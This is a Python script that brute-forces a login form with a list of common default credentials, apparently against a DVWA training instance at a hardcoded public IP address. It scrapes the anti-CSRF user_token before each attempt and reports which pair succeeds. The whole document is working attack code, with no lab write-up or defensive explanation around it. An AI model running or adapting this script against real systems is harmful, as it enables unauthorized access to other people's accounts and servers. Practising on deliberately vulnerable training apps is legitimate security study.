
import requests
import re
from urllib.parse import urljoin

# Setup session with cookies
session = requests.Session()
url = "http://31.97.117.123"

# Common DVWA default credentials
credentials = [
    ("admin", "admin"),
    ("admin", "password"),
    ("user", "password"),
    ("admin", "admin123"),
    ("user", "user"),
    ("admin", "letmein"),
    ("administrator", "administrator"),
    ("admin", "123456"),
    ("root", "root"),
    ("guest", "guest"),
]

attempt = 0
for username, password in credentials:
    attempt += 1
    print(f"\n[Attempt {attempt}] Trying: {username}:{password}")
    
    # Get login page first to extract user_token
    login_page = session.get(f"{url}/login.php")
    match = re.search(r"user_token'\s+value='([^']+)'", login_page.text)
    user_token = match.group(1) if match else ""
    
    # Post login attempt
    data = {
        "username": username,
        "password": password,
        "user_token": user_token,
        "Login": "Login"
    }
    
    response = session.post(f"{url}/login.php", data=data)
    
    if "Location" in response.headers:
        print(f"[-] Redirect detected - likely failed")
    elif "logout" in response.text.lower() or "dashboard" in response.text.lower() or response.status_code == 200 and "login" not in response.text.lower():
        print(f"[+] SUCCESS! Credentials: {username}:{password}")
        break
    else:
        print(f"[-] Failed")
    
    if attempt >= 10:
        print("\n[!] Reached 10 unsuccessful attempts")
        break


